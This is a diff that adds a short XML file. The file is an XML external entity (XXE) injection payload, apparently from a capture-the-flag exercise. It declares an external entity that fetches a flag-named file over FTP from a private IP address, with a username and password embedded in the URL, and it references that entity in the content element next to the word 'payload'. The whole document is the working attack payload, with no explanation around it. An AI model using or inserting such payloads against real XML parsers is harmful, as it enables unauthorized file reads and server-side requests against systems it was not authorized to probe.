@@ -1,0 +1,7 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!DOCTYPE person [<!ENTITY remote SYSTEM "ftp://syc10ver:Eec5TN9fruOOTp2G@172.21.0.4/flag327a6c4304ad5938eaf0efb6cc3e53dc">]>
+<plans>
+    <plan>
+        <content>payload &remote;</content>
+    </plan>
+</plans>
